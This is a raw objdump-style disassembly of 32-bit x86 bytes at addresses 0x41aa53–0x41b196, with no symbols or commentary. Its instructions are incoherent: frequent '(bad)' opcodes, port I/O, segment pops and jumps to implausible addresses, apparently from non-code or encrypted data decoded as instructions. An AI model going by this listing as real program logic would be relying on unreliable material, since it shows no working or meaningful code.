  41aa53:	in     eax,0x7c
  41aa55:	aam    0x39
  41aa57:	and    bh,BYTE PTR [esi]
  41aa59:	loopne 0x41a9fa
  41aa5b:	int    0x79
  41aa5d:	push   es
  41aa5e:	imul   eax,DWORD PTR [eax+0x3fbe2fb0],0x5339bcc2
  41aa68:	xor    eax,0xec1eb981
  41aa6d:	jmp    0x3355c3ae
  41aa72:	mov    ebx,0xa9b46854
  41aa77:	leave  
  41aa78:	cdq    
  41aa79:	retf   0x33ad
  41aa7c:	call   0x5882175b
  41aa81:	sub    ebp,esi
  41aa83:	shr    BYTE PTR [esi+0x3c],0x75
  41aa87:	stos   DWORD PTR es:[edi],eax
  41aa88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa89:	add    al,bh
  41aa8b:	inc    edi
  41aa8c:	ficom  DWORD PTR ds:0xaccf356
  41aa92:	sub    al,0xa7
  41aa94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa95:	jbe    0x41aa48
  41aa97:	inc    ebp
  41aa98:	inc    edi
  41aa99:	add    al,0xec
  41aa9b:	cmp    DWORD PTR [edx+0x47],ebx
  41aa9e:	arpl   WORD PTR [ebx],cx
  41aaa0:	rcr    DWORD PTR [eax],0x64
  41aaa3:	add    cl,BYTE PTR [edx]
  41aaa5:	mov    bl,0x72
  41aaa7:	imul   BYTE PTR [esp+ecx*1]
  41aaaa:	ins    DWORD PTR es:[edi],dx
  41aaab:	out    dx,al
  41aaac:	das    
  41aaad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aaae:	test   dh,0x27
  41aab1:	fdivr  QWORD PTR [esi+0x7c5926da]
  41aab7:	adc    al,0x7c
  41aab9:	xchg   DWORD PTR [esi+0x4a232ed3],esp
  41aabf:	mov    al,ds:0xc06c7084
  41aac4:	adc    DWORD PTR [edx],ebp
  41aac6:	sbb    bl,BYTE PTR [esi]
  41aac8:	in     al,dx
  41aac9:	rcl    DWORD PTR [edi+0x43],0x1a
  41aacd:	mov    edi,0xa53583d8
  41aad2:	mov    ch,0xad
  41aad4:	ins    DWORD PTR es:[edi],dx
  41aad5:	pop    edx
  41aad6:	lods   eax,DWORD PTR ds:[esi]
  41aad7:	push   ss
  41aad8:	inc    ebx
  41aad9:	pop    ds
  41aada:	outs   dx,BYTE PTR ds:[esi]
  41aadb:	sbb    eax,0xc9b2858f
  41aae0:	push   ds
  41aae1:	adc    DWORD PTR [edi-0x2],0x5c4f0b9f
  41aae8:	cwde   
  41aae9:	cmp    BYTE PTR [ebp+0x0],cl
  41aaec:	add    DWORD PTR [edi-0x1a],0x8b5e2b44
  41aaf3:	xchg   ecx,eax
  41aaf4:	xchg   edx,eax
  41aaf5:	mov    DWORD PTR [edx-0x4],edx
  41aaf8:	jmp    0x41aa93
  41aafa:	sbb    edx,edi
  41aafc:	gs cs push 0xe18b3c19
  41ab03:	mov    ds:0xfc561c1b,eax
  41ab08:	bound  esp,QWORD PTR [esi]
  41ab0a:	inc    ecx
  41ab0b:	jne    0x41aa94
  41ab0d:	gs (bad) 
  41ab0f:	sahf   
  41ab10:	in     eax,dx
  41ab11:	(bad)  
  41ab12:	bound  eax,QWORD PTR [esi+0xa30eb68]
  41ab18:	push   ds
  41ab19:	int3   
  41ab1a:	popa   
  41ab1b:	or     cl,BYTE PTR [eax+ebp*4-0x30]
  41ab1f:	aad    0x80
  41ab21:	jnp    0x41ab6b
  41ab23:	(bad)  
  41ab24:	cmp    eax,edx
  41ab26:	out    0x85,eax
  41ab28:	mov    esp,0x9c6a10db
  41ab2d:	sub    BYTE PTR [ebx+0x2d],dl
  41ab30:	mov    eax,ds:0x735dbc93
  41ab35:	push   edx
  41ab36:	std    
  41ab37:	out    0xc4,eax
  41ab39:	(bad)  
  41ab3a:	cmc    
  41ab3b:	rol    DWORD PTR [esi+0x36],cl
  41ab3e:	fsub   QWORD PTR [ecx-0x12c1e0ee]
  41ab44:	push   ecx
  41ab45:	pop    ss
  41ab46:	sub    bl,BYTE PTR [esi-0x64]
  41ab49:	das    
  41ab4a:	add    edi,eax
  41ab4c:	fwait
  41ab4d:	addr16 (bad) 
  41ab4f:	and    al,BYTE PTR [eax+ecx*2+0x33476a6f]
  41ab56:	fwait
  41ab57:	pop    ss
  41ab58:	push   esp
  41ab59:	aam    0xbd
  41ab5b:	mov    esi,0x934eb480
  41ab60:	push   0xf8d38893
  41ab65:	inc    edi
  41ab66:	add    ebx,DWORD PTR [ecx+0x49]
  41ab69:	pop    ss
  41ab6a:	push   edi
  41ab6b:	pop    edi
  41ab6c:	inc    esp
  41ab6d:	mov    WORD PTR [edx],?
  41ab6f:	push   ebp
  41ab70:	push   ecx
  41ab71:	dec    esp
  41ab72:	and    al,0x64
  41ab74:	aaa    
  41ab75:	push   0xffffffca
  41ab77:	addr16 (bad) 
  41ab7a:	sub    DWORD PTR [edx+0x69],esp
  41ab7d:	and    al,0x9f
  41ab7f:	xchg   ebx,eax
  41ab80:	dec    edx
  41ab81:	sub    esp,DWORD PTR [edi+0x12d8d8a5]
  41ab87:	sub    DWORD PTR [edx-0x49],0x38481a58
  41ab8e:	js     0x41ab4f
  41ab90:	loope  0x41abe9
  41ab92:	jge    0x41ab8c
  41ab94:	xor    eax,0x81bea43c
  41ab99:	pop    ecx
  41ab9a:	lods   al,BYTE PTR ds:[esi]
  41ab9b:	mov    bp,0xb02b
  41ab9f:	add    al,0xb5
  41aba1:	sub    ecx,ebp
  41aba3:	mov    al,0x1c
  41aba5:	or     DWORD PTR [eax],ecx
  41aba7:	sub    al,BYTE PTR [edx]
  41aba9:	imul   esp,esi,0xe02b7546
  41abaf:	dec    ebx
  41abb0:	in     eax,0x2f
  41abb2:	inc    esi
  41abb3:	mov    eax,ds:0xcd043aa
  41abb8:	adc    eax,DWORD PTR [ebp-0x70]
  41abbb:	mov    bl,0xad
  41abbd:	call   0x644935f3
  41abc2:	js     0x41ac11
  41abc4:	jp     0x41abd6
  41abc6:	iret   
  41abc7:	mov    bh,0x5b
  41abc9:	fsubr  st(2),st
  41abcb:	out    dx,al
  41abcc:	dec    eax
  41abcd:	xor    esp,DWORD PTR [edx+0x77]
  41abd0:	or     BYTE PTR [edx-0x745ee193],ch
  41abd6:	jo     0x41ab81
  41abd8:	stos   DWORD PTR es:[edi],eax
  41abd9:	inc    ebx
  41abda:	jne    0x41abaa
  41abdc:	js     0x41abd1
  41abde:	jmp    0xbae:0xd36e58dd
  41abe5:	mov    eax,0xad10b216
  41abea:	test   DWORD PTR [ecx+0x0],ecx
  41abed:	mov    edx,edi
  41abef:	lods   eax,DWORD PTR ds:[esi]
  41abf0:	sub    ch,BYTE PTR [edi+0x4acdfc0e]
  41abf6:	jge    0x41ac0e
  41abf8:	pop    ds
  41abf9:	mov    ds:0xc302da17,al
  41abfe:	lods   al,BYTE PTR ds:[esi]
  41abff:	mov    dh,0xf6
  41ac01:	inc    ebp
  41ac02:	lahf   
  41ac03:	jl     0x41ac2f
  41ac05:	mov    al,ds:0x43398b76
  41ac0a:	pop    ds
  41ac0b:	and    edi,ebx
  41ac0d:	xor    ebp,DWORD PTR [eax+0x273c5914]
  41ac13:	and    BYTE PTR [edx],dh
  41ac15:	dec    ecx
  41ac16:	push   ebp
  41ac17:	faddp  st(2),st
  41ac19:	(bad)  
  41ac1a:	in     eax,dx
  41ac1b:	or     eax,0x409af5a0
  41ac20:	jg     0x41abbe
  41ac22:	push   0xffffffaa
  41ac24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac25:	addr16 xchg edi,eax
  41ac27:	ror    DWORD PTR [ebx-0x3dafacef],cl
  41ac2d:	xor    BYTE PTR [esi-0x136f9186],cl
  41ac33:	out    0x45,eax
  41ac35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac36:	imul   edx,DWORD PTR [esi],0xc8e6d146
  41ac3c:	mov    ebx,0x391957c2
  41ac41:	push   ebx
  41ac42:	jmp    0x1ad38021
  41ac47:	mov    ah,0xa8
  41ac49:	pop    esi
  41ac4a:	jecxz  0x41abcc
  41ac4c:	and    eax,0xdd24bd61
  41ac51:	pusha  
  41ac52:	in     al,0x7c
  41ac54:	and    bl,BYTE PTR [eax]
  41ac56:	(bad)  
  41ac58:	mov    edx,0xf55cd702
  41ac5e:	push   es
  41ac5f:	cmp    eax,0x8981d90e
  41ac64:	mov    bh,0x40
  41ac66:	pop    ds
  41ac67:	sub    ah,BYTE PTR [ebp-0x7a4b70b6]
  41ac6d:	pop    eax
  41ac6e:	or     BYTE PTR [edx+0x1e],al
  41ac71:	push   es
  41ac72:	sbb    eax,0x29998ae
  41ac77:	ins    DWORD PTR es:[edi],dx
  41ac78:	adc    ebx,DWORD PTR [edx]
  41ac7a:	popa   
  41ac7b:	mov    bh,0x51
  41ac7d:	inc    edi
  41ac7e:	mov    ebx,0x9d8aa208
  41ac83:	gs fs cld 
  41ac86:	inc    edi
  41ac87:	and    al,0x54
  41ac89:	dec    esp
  41ac8a:	cld    
  41ac8b:	pushf  
  41ac8c:	xchg   ebx,eax
  41ac8d:	js     0x41ac3f
  41ac8f:	cld    
  41ac90:	inc    edi
  41ac91:	sub    esi,ebp
  41ac93:	sub    BYTE PTR [ecx],dl
  41ac95:	jp     0x41ac3f
  41ac97:	ins    BYTE PTR es:[edi],dx
  41ac98:	cmp    al,0x40
  41ac9a:	cmc    
  41ac9b:	(bad)  [ecx-0xb]
  41ac9e:	mov    eax,0x63cdf36b
  41aca3:	fs fwait
  41aca5:	inc    esp
  41aca6:	jo     0x41ac7e
  41aca8:	mov    eax,ds:0xe495bba6
  41acad:	shl    al,0xdd
  41acb0:	enter  0xfeb5,0x60
  41acb4:	popf   
  41acb5:	daa    
  41acb6:	adc    BYTE PTR [ecx-0x34],ch
  41acb9:	sub    al,0x58
  41acbb:	call   0x35ff062
  41acc0:	fcmovb st,st(3)
  41acc2:	xchg   edx,eax
  41acc3:	dec    ebx
  41acc4:	and    al,0xbf
  41acc6:	jge    0x41acce
  41acc8:	mov    ah,0xd9
  41acca:	lds    edi,FWORD PTR [ebp-0x798cacbf]
  41acd0:	mov    edi,0x97c82264
  41acd5:	mov    ah,0xee
  41acd7:	test   al,0xb8
  41acd9:	jb     0x41ac9e
  41acdb:	mov    bh,0xf0
  41acdd:	repz jnp 0x41ad36
  41ace0:	ins    DWORD PTR es:[edi],dx
  41ace1:	xchg   esi,eax
  41ace2:	or     eax,DWORD PTR [ebx-0x577157cc]
  41ace8:	add    cl,BYTE PTR [bx-0x7fb9]
  41aced:	test   eax,0x1d665b1c
  41acf2:	loop   0x41ac87
  41acf4:	leave  
  41acf5:	jmp    0xe839fc31
  41acfa:	push   ss
  41acfb:	sub    bh,BYTE PTR [esi-0x43b4523f]
  41ad01:	mov    DWORD PTR [eax+ecx*8],ebx
  41ad04:	pop    eax
  41ad05:	pop    ss
  41ad06:	push   ebx
  41ad07:	add    dh,BYTE PTR [ecx+0x38daa976]
  41ad0d:	mov    DWORD PTR [esi-0x2ab08bbf],ebp
  41ad13:	cwde   
  41ad14:	daa    
  41ad15:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41ad17:	sub    BYTE PTR [ebx],cl
  41ad19:	outs   dx,DWORD PTR ds:[esi]
  41ad1a:	push   edi
  41ad1b:	mov    ebp,0x95f9c19
  41ad20:	aam    0x1b
  41ad22:	(bad)  
  41ad24:	ja     0x41ad13
  41ad26:	pop    ebp
  41ad27:	sbb    eax,0x28ea9459
  41ad2c:	dec    ebp
  41ad2d:	repz (bad) 
  41ad2f:	mov    edx,0xd118fe17
  41ad34:	adc    ebp,edi
  41ad36:	mov    al,ds:0xbcbf53a8
  41ad3b:	pop    edx
  41ad3c:	xor    cl,BYTE PTR [ecx]
  41ad3e:	aaa    
  41ad3f:	popa   
  41ad40:	lahf   
  41ad41:	and    BYTE PTR [ebx+0x5],bl
  41ad44:	sbb    al,BYTE PTR [edi+ebp*2-0x3d]
  41ad48:	cmp    edx,ebx
  41ad4a:	mov    BYTE PTR [ebx+0x71],bh
  41ad4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad4e:	sbb    BYTE PTR [edx],bl
  41ad50:	std    
  41ad51:	lahf   
  41ad52:	rcr    BYTE PTR [edi+0x513c7d55],cl
  41ad58:	push   esi
  41ad59:	retf   0x6d95
  41ad5c:	aam    0x2c
  41ad5e:	test   DWORD PTR [esi],ecx
  41ad60:	loopne 0x41ada1
  41ad62:	sbb    BYTE PTR ds:0xd1eeaf4a,0xe0
  41ad69:	into   
  41ad6a:	ins    DWORD PTR es:[edi],dx
  41ad6b:	lods   eax,DWORD PTR ds:[esi]
  41ad6c:	mov    cl,0x24
  41ad6e:	lods   al,BYTE PTR ds:[esi]
  41ad6f:	mov    al,0xf3
  41ad71:	retf   0xb71b
  41ad74:	inc    edi
  41ad75:	mov    ds:0xb192385b,eax
  41ad7a:	std    
  41ad7b:	mov    esp,0x567fba7f
  41ad80:	fnstenv [eax+0x79]
  41ad83:	jg     0x41ad93
  41ad85:	imul   edx,DWORD PTR [ebx],0x7167dc0d
  41ad8b:	loope  0x41ae06
  41ad8d:	sbb    eax,0x2aabb7ff
  41ad92:	dec    ebx
  41ad93:	push   edi
  41ad94:	push   0xfffffff5
  41ad96:	ins    DWORD PTR es:[edi],dx
  41ad97:	xchg   ecx,eax
  41ad98:	push   ebp
  41ad99:	out    0x80,al
  41ad9b:	sbb    cl,ch
  41ad9d:	push   cs
  41ad9e:	cmp    ah,BYTE PTR [eax]
  41ada0:	or     edi,esp
  41ada2:	add    eax,0xbeac9049
  41ada7:	in     al,dx
  41ada8:	mov    ebp,0x54099709
  41adad:	lock jnp 0x41ad4e
  41adb0:	push   esi
  41adb1:	cwde   
  41adb2:	push   esi
  41adb3:	jns    0x41ad97
  41adb5:	fs push ebx
  41adb7:	sbb    ch,ch
  41adb9:	push   0xffffffa0
  41adbb:	mov    esp,0xc8ec502f
  41adc0:	add    ch,bl
  41adc2:	jl     0x41ad5d
  41adc4:	sub    al,0x4
  41adc6:	inc    esp
  41adc7:	xchg   ebx,eax
  41adc8:	jle    0x41ad58
  41adca:	dec    esi
  41adcb:	fldcw  WORD PTR [esp+eiz*2]
  41adce:	div    BYTE PTR [ebp-0x69b57bca]
  41add4:	xor    ebp,DWORD PTR [eax+edx*1]
  41add7:	f2xm1  
  41add9:	jbe    0x41ae5a
  41addb:	(bad)  
  41addc:	cli    
  41addd:	push   ecx
  41adde:	and    eax,0x3fbd51a3
  41ade3:	lock inc ebp
  41ade5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ade6:	add    eax,0x3f0591a7
  41adeb:	mov    ch,0x66
  41aded:	ja     0x41ae2e
  41adef:	in     eax,0x37
  41adf1:	and    esi,esp
  41adf3:	and    al,0x50
  41adf5:	jl     0x41ad99
  41adf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adf8:	idiv   BYTE PTR [ecx]
  41adfa:	in     eax,0x8c
  41adfc:	mov    edi,0x2292867a
  41ae01:	adc    edi,edi
  41ae03:	and    BYTE PTR ds:0x2d25cdf1,dl
  41ae09:	inc    edx
  41ae0a:	push   es
  41ae0b:	jmp    0x41adca
  41ae0d:	sbb    ch,dl
  41ae0f:	xor    ebp,DWORD PTR [esi+0x6a5b62d9]
  41ae15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae16:	jg     0x41adda
  41ae18:	mov    ch,0xe5
  41ae1a:	nop
  41ae1b:	neg    DWORD PTR [edi]
  41ae1d:	in     al,dx
  41ae1e:	dec    ebp
  41ae1f:	mov    edx,0x418f30b2
  41ae24:	neg    cl
  41ae26:	mov    BYTE PTR ds:0xdc008f59,dh
  41ae2c:	xor    eax,esi
  41ae2e:	mov    eax,ds:0xe953c59e
  41ae33:	lods   al,BYTE PTR ds:[esi]
  41ae34:	cmp    al,0xa7
  41ae36:	stos   DWORD PTR es:[edi],eax
  41ae37:	loop   0x41ae49
  41ae39:	into   
  41ae3a:	fincstp 
  41ae3c:	ret    
  41ae3d:	mov    bl,0xfa
  41ae3f:	sahf   
  41ae40:	jmp    0x41ae69
  41ae42:	xor    esp,DWORD PTR [esi]
  41ae44:	push   ebp
  41ae45:	aad    0xfd
  41ae47:	jp     0x41adf4
  41ae49:	je     0x41ae95
  41ae4b:	pop    ebx
  41ae4c:	sar    DWORD PTR [ebp+0x2a2a12b5],1
  41ae52:	ins    DWORD PTR es:[edi],dx
  41ae53:	or     DWORD PTR [edi+0xca3ae9f],esp
  41ae59:	fcomp  QWORD PTR [eax]
  41ae5b:	das    
  41ae5c:	hlt    
  41ae5d:	sbb    BYTE PTR [eax+ebx*4+0xe5747dc],0xf2
  41ae65:	out    dx,al
  41ae66:	pushf  
  41ae67:	stos   DWORD PTR es:[edi],eax
  41ae68:	push   ebx
  41ae69:	pusha  
  41ae6a:	enter  0x1050,0x6d
  41ae6e:	push   0x8e49e22
  41ae73:	sbb    esi,edi
  41ae75:	addr16 or ch,0x2d
  41ae79:	ret    0xdf77
  41ae7c:	push   0xb050ad68
  41ae81:	aad    0x6b
  41ae83:	pop    es
  41ae84:	pop    ecx
  41ae85:	pop    ds
  41ae86:	fdivr  st(2),st
  41ae88:	pop    ds
  41ae89:	inc    edi
  41ae8a:	sub    BYTE PTR [ebx+0x7f7d579d],ch
  41ae90:	aam    0x87
  41ae92:	ss xchg esi,eax
  41ae94:	(bad)  
  41ae95:	cdq    
  41ae96:	or     ch,BYTE PTR [ecx+esi*4-0x39]
  41ae9a:	jg     0x41aed7
  41ae9c:	mov    eax,ds:0xbf5f28dc
  41aea1:	aad    0x31
  41aea3:	mov    eax,0x4bab4179
  41aea8:	pop    esp
  41aea9:	pop    ebp
  41aeaa:	mov    dh,0x3e
  41aeac:	jb     0x41ae60
  41aeae:	arpl   WORD PTR [edi+ebp*4+0x65bb3863],dx
  41aeb5:	add    DWORD PTR [edx],ebp
  41aeb7:	imul   DWORD PTR [ecx+esi*8]
  41aeba:	les    esi,FWORD PTR [ebp+ebx*2+0x4b]
  41aebe:	test   al,0xe7
  41aec0:	jns    0x41aea5
  41aec2:	lods   al,BYTE PTR ds:[esi]
  41aec3:	fimul  DWORD PTR [edi]
  41aec5:	repz add BYTE PTR [esi+0x14],al
  41aec9:	and    dl,bl
  41aecb:	inc    edi
  41aecc:	pop    eax
  41aecd:	clc    
  41aece:	adc    al,0x9a
  41aed0:	dec    eax
  41aed1:	jbe    0x41ae71
  41aed3:	push   0xec10397f
  41aed8:	idiv   BYTE PTR [ebp-0x5a]
  41aedb:	sub    al,0x6
  41aedd:	adc    dh,BYTE PTR [edx-0x18f486d8]
  41aee3:	and    edx,DWORD PTR gs:[esi]
  41aee6:	and    BYTE PTR [edi-0x77],ah
  41aee9:	fisubr DWORD PTR [ecx-0x79]
  41aeec:	mov    ds:0x6d96e6b4,al
  41aef1:	stc    
  41aef2:	push   esp
  41aef3:	les    esi,FWORD PTR [ebp-0x35]
  41aef6:	mov    bl,0xa5
  41aef8:	out    0x7c,eax
  41aefa:	loop   0x41af71
  41aefc:	jo     0x41af57
  41aefe:	mul    DWORD PTR [eax]
  41af00:	shl    bl,cl
  41af02:	ret    
  41af03:	jecxz  0x41af67
  41af05:	scas   eax,DWORD PTR es:[edi]
  41af06:	jge    0x41af11
  41af08:	cmp    DWORD PTR [esi+0x743b687a],ebp
  41af0e:	data16 (bad) 
  41af11:	mov    dl,0xbc
  41af13:	xchg   BYTE PTR [ebx],ch
  41af15:	repz pop esp
  41af17:	dec    edi
  41af18:	inc    edx
  41af19:	add    BYTE PTR [ecx-0x4a],cl
  41af1c:	mov    DWORD PTR [edi-0x37],ebp
  41af1f:	mov    edi,0x2c65f03f
  41af24:	cwde   
  41af25:	mov    dl,0xb5
  41af27:	test   BYTE PTR [edi+0x3e84aa62],bh
  41af2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af2e:	ret    
  41af2f:	jns    0x41af3b
  41af31:	adc    al,0x2e
  41af33:	dec    edi
  41af34:	dec    edi
  41af35:	mov    ebx,0xede6109b
  41af3a:	xor    al,0xbb
  41af3c:	mov    edi,0x69130d8b
  41af41:	lods   eax,DWORD PTR cs:[esi]
  41af43:	stc    
  41af44:	arpl   di,bp
  41af46:	pop    eax
  41af47:	cmp    ecx,DWORD PTR [edi-0x36]
  41af4a:	adc    BYTE PTR [edi-0x1bdbb6b6],bh
  41af50:	stc    
  41af51:	popa   
  41af52:	adc    eax,0x891263be
  41af57:	int3   
  41af58:	icebp  
  41af59:	inc    edi
  41af5a:	lods   al,BYTE PTR ds:[esi]
  41af5b:	cmp    BYTE PTR [edx],dl
  41af5d:	retf   
  41af5e:	mov    WORD PTR [ecx+0x78f4f624],es
  41af64:	stos   DWORD PTR es:[edi],eax
  41af65:	cmp    BYTE PTR [ebx+edx*4-0x52],0x6c
  41af6a:	and    DWORD PTR ds:0x9447e366,edi
  41af70:	clc    
  41af71:	dec    eax
  41af72:	adc    DWORD PTR [ecx+eiz*2-0x98178ee],0x9
  41af7a:	fs das 
  41af7c:	mov    ebx,0x19c637e5
  41af81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af82:	mov    ah,0x13
  41af84:	jo     0x41af2d
  41af86:	xchg   BYTE PTR [edi+0x5e],ah
  41af89:	ret    
  41af8a:	xchg   edi,eax
  41af8b:	mov    ds:0x2e394668,al
  41af90:	fiadd  WORD PTR [eax-0x39]
  41af93:	lock lods al,BYTE PTR ds:[esi]
  41af95:	ret    0x362b
  41af98:	repnz xor eax,0x6026b1c6
  41af9e:	pop    ds
  41af9f:	out    0x6b,eax
  41afa1:	enter  0x43d5,0x82
  41afa5:	in     eax,0xad
  41afa7:	outs   dx,BYTE PTR ds:[esi]
  41afa8:	retf   0x3532
  41afab:	(bad)  
  41afac:	pushf  
  41afad:	mov    al,0x28
  41afaf:	ins    DWORD PTR es:[edi],dx
  41afb0:	shr    DWORD PTR [esi-0x7ca0c45c],cl
  41afb6:	enter  0x5f4,0x4c
  41afba:	inc    esp
  41afbb:	das    
  41afbc:	mov    WORD PTR [esi+0x7ddfedfc],fs
  41afc2:	jge    0x41af6d
  41afc4:	mov    dh,0x40
  41afc6:	out    0x9,al
  41afc8:	jl     0x41afbb
  41afca:	cdq    
  41afcb:	into   
  41afcc:	fild   QWORD PTR ds:0x805e1db
  41afd2:	dec    esp
  41afd3:	test   eax,0xbfcb9e7c
  41afd8:	pushf  
  41afd9:	or     ch,BYTE PTR [ecx]
  41afdb:	fmul   DWORD PTR [eax]
  41afdd:	mov    cl,0x39
  41afdf:	call   0xf569196
  41afe4:	retf   
  41afe5:	scas   al,BYTE PTR es:[edi]
  41afe6:	shld   DWORD PTR [ebx+0x35],ebp,0x3b
  41afeb:	inc    esp
  41afec:	(bad)
  41afef:	clc    
  41aff0:	jl     0x41afde
  41aff2:	retf   0xf11a
  41aff5:	dec    edi
  41aff6:	or     eax,0x8b3a2f4d
  41affb:	pop    ebx
  41affc:	add    BYTE PTR [edx],dh
  41affe:	dec    edx
  41afff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b000:	adc    dh,BYTE PTR [ebp-0x36]
  41b003:	add    edi,DWORD PTR [esi+0x19]
  41b006:	test   DWORD PTR [edx],0x31418467
  41b00c:	popf   
  41b00d:	imul   edi,DWORD PTR [eax-0x8],0x2d1fb3db
  41b014:	scas   al,BYTE PTR es:[edi]
  41b015:	stos   DWORD PTR es:[edi],eax
  41b016:	jmp    0xe31ef20c
  41b01b:	ds sub eax,0x5b033e53
  41b021:	jmp    0x41b003
  41b023:	les    edi,FWORD PTR [edx-0x1f]
  41b026:	jns    0x41b034
  41b028:	inc    eax
  41b029:	daa    
  41b02a:	dec    edx
  41b02b:	aam    0xa5
  41b02d:	push   ebp
  41b02e:	push   esp
  41b02f:	push   esp
  41b030:	xor    al,0x4
  41b032:	dec    ebx
  41b033:	fwait
  41b034:	inc    ecx
  41b035:	sub    al,0x18
  41b037:	sub    al,0xd6
  41b039:	jo     0x41afcd
  41b03b:	loopne 0x41b08f
  41b03d:	mov    BYTE PTR [edi-0x78175626],ah
  41b043:	jecxz  0x41b093
  41b045:	pop    ss
  41b046:	lock std 
  41b048:	xchg   ebx,eax
  41b049:	ret    
  41b04a:	aad    0xd8
  41b04c:	in     al,dx
  41b04d:	mov    cl,0x6d
  41b04f:	fstp   DWORD PTR [ebx+0x520a6aaf]
  41b055:	mov    eax,ds:0xa5a3d88e
  41b05a:	scas   eax,DWORD PTR es:[edi]
  41b05b:	mov    bh,0xf1
  41b05d:	xor    al,0x49
  41b05f:	adc    ecx,DWORD PTR [ecx+0x34]
  41b062:	das    
  41b063:	in     al,0xd5
  41b065:	adc    al,0xcb
  41b067:	shl    ch,0x15
  41b06a:	jl     0x41b0d0
  41b06c:	or     edi,DWORD PTR [esi-0x4b3b99a3]
  41b072:	inc    ecx
  41b073:	pushf  
  41b074:	retf   0xc7fd
  41b077:	dec    esp
  41b078:	out    dx,al
  41b079:	cmp    edx,edx
  41b07b:	jbe    0x41b0ef
  41b07d:	in     eax,dx
  41b07e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b07f:	nop
  41b080:	loope  0x41b0fd
  41b082:	cmp    al,0x7a
  41b084:	test   BYTE PTR [ecx],bl
  41b086:	inc    eax
  41b087:	pusha  
  41b088:	add    edx,DWORD PTR [esi-0x2922cd71]
  41b08e:	jmp    0x41b07f
  41b090:	ucomiss xmm7,xmm3
  41b093:	jp     0x41b01a
  41b095:	outs   dx,DWORD PTR ds:[esi]
  41b096:	clc    
  41b097:	hlt    
  41b098:	ret    
  41b099:	jnp    0x41b0d2
  41b09b:	loopne 0x41b105
  41b09d:	xor    al,0x8d
  41b09f:	in     eax,dx
  41b0a0:	(bad)  
  41b0a1:	or     DWORD PTR [eax],ecx
  41b0a3:	loop   0x41b10e
  41b0a5:	jl     0x41b073
  41b0a7:	jne    0x41b0f9
  41b0a9:	and    al,0x1
  41b0ab:	push   esp
  41b0ac:	push   ss
  41b0ad:	dec    ebp
  41b0ae:	in     eax,0xf1
  41b0b0:	retf   0xaf0d
  41b0b3:	fist   WORD PTR [edi]
  41b0b5:	bound  ecx,QWORD PTR [esi]
  41b0b7:	arpl   WORD PTR [ebx+eax*4],ax
  41b0ba:	xchg   edx,eax
  41b0bb:	push   ebx
  41b0bc:	mov    al,0xd3
  41b0be:	jo     0x41b132
  41b0c0:	mov    ds:0xc8617de0,al
  41b0c5:	jp     0x41b0a7
  41b0c7:	je     0x41b0fb
  41b0c9:	es push ebx
  41b0cb:	push   es
  41b0cc:	adc    esp,DWORD PTR [esi+ebx*2]
  41b0cf:	inc    ebx
  41b0d0:	arpl   WORD PTR [edx+0x58a71ba7],bp
  41b0d6:	jns    0x41b0e8
  41b0d8:	in     al,dx
  41b0d9:	ror    BYTE PTR [eax],0x58
  41b0dc:	or     eax,0xf39b76d2
  41b0e1:	jnp    0x41b103
  41b0e3:	aas    
  41b0e4:	pop    ds
  41b0e5:	push   edi
  41b0e6:	mov    ah,0x98
  41b0e8:	sub    DWORD PTR [edx],ebx
  41b0ea:	leave  
  41b0eb:	add    BYTE PTR [eax+0x11],dh
  41b0ee:	pop    ss
  41b0ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0f0:	cmp    eax,0x713ad4a0
  41b0f5:	cmp    dh,BYTE PTR [ecx+0x24]
  41b0f8:	popa   
  41b0f9:	jbe    0x41b0f1
  41b0fb:	mov    dh,0x4
  41b0fd:	adc    al,0x36
  41b0ff:	pop    ecx
  41b100:	push   0x61
  41b102:	xor    BYTE PTR [ebp-0x463c27c8],0xe
  41b109:	adc    al,0x37
  41b10b:	stos   BYTE PTR es:[edi],al
  41b10c:	bswap  edi
  41b10e:	mov    WORD PTR [edi-0x3b34ed84],ss
  41b114:	ror    eax,0x60
  41b117:	cdq    
  41b118:	or     BYTE PTR [eax],0x2f
  41b11b:	(bad)
  41b11f:	mov    ebp,0x9c7e8fa7
  41b124:	pop    ds
  41b125:	jge    0x41b10f
  41b127:	xrelease xchg BYTE PTR [edi-0x53],dl
  41b12b:	sbb    eax,0x8d87bc1a
  41b130:	mov    ch,0xa1
  41b132:	mov    ah,0xa4
  41b134:	xchg   esp,eax
  41b135:	inc    ecx
  41b136:	fisttp DWORD PTR [edx]
  41b138:	lods   al,BYTE PTR ds:[esi]
  41b139:	push   ss
  41b13a:	add    ch,BYTE PTR [ebx-0x2ea1c8bc]
  41b140:	out    0x2a,al
  41b142:	sub    eax,0x5711304f
  41b147:	xchg   edx,eax
  41b148:	mov    esi,0x35ac9122
  41b14d:	push   edi
  41b14e:	add    cl,BYTE PTR [esi-0x120c42fe]
  41b154:	cwde   
  41b155:	xchg   esp,eax
  41b156:	xchg   ecx,eax
  41b157:	std    
  41b158:	test   al,0xd3
  41b15a:	or     eax,0x9deadb
  41b15f:	test   eax,0x9e450d65
  41b164:	xlat   BYTE PTR ds:[ebx]
  41b165:	push   esp
  41b166:	popa   
  41b167:	imul   esp,DWORD PTR [eax-0x69e74836],0x1923790
  41b171:	xor    al,bl
  41b173:	fstp   QWORD PTR [eax+0x33]
  41b176:	sti    
  41b177:	mov    edi,0x99c53dad
  41b17c:	sbb    ah,bl
  41b17e:	adc    eax,0xb1c49d7
  41b183:	mov    ecx,0x98df9641
  41b188:	dec    ebx
  41b189:	and    DWORD PTR [eax],ecx
  41b18b:	dec    esi
  41b18c:	sbb    bh,BYTE PTR [esi+0x2997f173]
  41b192:	scas   eax,DWORD PTR es:[edi]
  41b193:	mov    BYTE PTR [esi-0x1a],bh
  41b196:	cmp    al,ah
